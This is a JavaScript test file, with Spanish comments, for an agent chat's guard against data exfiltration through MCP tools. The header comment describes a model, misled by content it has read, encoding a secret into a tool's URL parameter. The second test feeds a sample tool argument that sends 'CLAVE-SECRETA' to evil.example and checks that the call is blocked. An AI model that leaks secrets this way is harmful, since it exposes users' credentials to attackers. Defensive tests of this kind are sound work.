// SEG-02 — el chat directo con un agente: una herramienta de lectura con un parámetro de dirección libre es un canal de salida (el modelo, engañado por lo que leyó,
// la llama con ?dato=SECRETO). No se ofrece, y si un argumento de otra herramienta lleva una dirección ajena al conector, la llamada se bloquea antes de salir.
import test from 'node:test';
import assert from 'node:assert/strict';
import { SALTAR } from './d1-memoria.mjs';
import { oficina, crearFetch, pagina, texto, usar } from './agentes-ayudas.mjs';

const ESQ_URL = { type: 'object', properties: { url: { type: 'string' } } };
const ESQ_Q = { type: 'object', properties: { query: { type: 'string' } } };
async function mundo(guion, hs) {
  const o = await oficina({ conector: true });
  o.d1._db.prepare('update conectores set herramientas_lectura = ?').run('["search_threads","fetch_page"]');
  const f = crearFetch({ guion, herramientasMcp: hs });
  o.env.__pruebas = { fetch: f.fetchFn };
  return { ...o, f, p: await pagina(o) };
}

test('chat: una herramienta de lectura con parámetro «url» no se ofrece al modelo y lo dice', { skip: SALTAR }, async () => {
  const hs = { search_threads: { salida: 'ok', esquema: ESQ_Q }, fetch_page: { salida: 'pagina', esquema: ESQ_URL } };
  const m = await mundo([texto('Listo.')], hs);
  const r = await m.p.admin('POST', '/api/chat', { agent: 'elead', text: 'Busca algo', history: [] });
  assert.equal(r.status, 200, JSON.stringify(r.j));
  const ofrecidas = (m.f.registro.anthropic[0].cuerpo.tools || []).map((t) => t.name).join(' ');
  assert.match(ofrecidas, /search_threads/); assert.doesNotMatch(ofrecidas, /fetch_page/);
  assert.match(r.j.reply, /fetch_page.*direcci/s, 'el dueño ve por qué');
});

test('chat: un argumento con una dirección ajena al conector se bloquea y la herramienta NO se llama', { skip: SALTAR }, async () => {
  const hs = { search_threads: { salida: 'ok', esquema: ESQ_Q } };
  const m = await mundo([usar(['mcp__gmail__search_threads', { query: 'ver https://evil.example/c?d=CLAVE-SECRETA' }]), texto('No pude.')], hs);
  const r = await m.p.admin('POST', '/api/chat', { agent: 'elead', text: 'Busca algo', history: [] });
  assert.equal(r.status, 200, JSON.stringify(r.j));
  assert.ok(!hs.search_threads.llamadas, 'nunca salió');
  const vuelta2 = JSON.stringify(m.f.registro.anthropic[1].cuerpo.messages);
  assert.match(vuelta2, /Bloqueado: el argumento lleva una direcci/);
  assert.ok(!m.f.registro.otros.length && !m.f.registro.mcp.some((x) => JSON.stringify(x.cuerpo).includes('evil.example')));
});

test('chat: una consulta normal sigue funcionando', { skip: SALTAR }, async () => {
  const hs = { search_threads: { salida: 'tres hilos', esquema: ESQ_Q } };
  const m = await mundo([usar(['mcp__gmail__search_threads', { query: 'facturas de octubre' }]), texto('Hay tres hilos.')], hs);
  const r = await m.p.admin('POST', '/api/chat', { agent: 'elead', text: 'Busca facturas', history: [] });
  assert.equal(r.status, 200, JSON.stringify(r.j)); assert.equal(hs.search_threads.llamadas, 1);
});
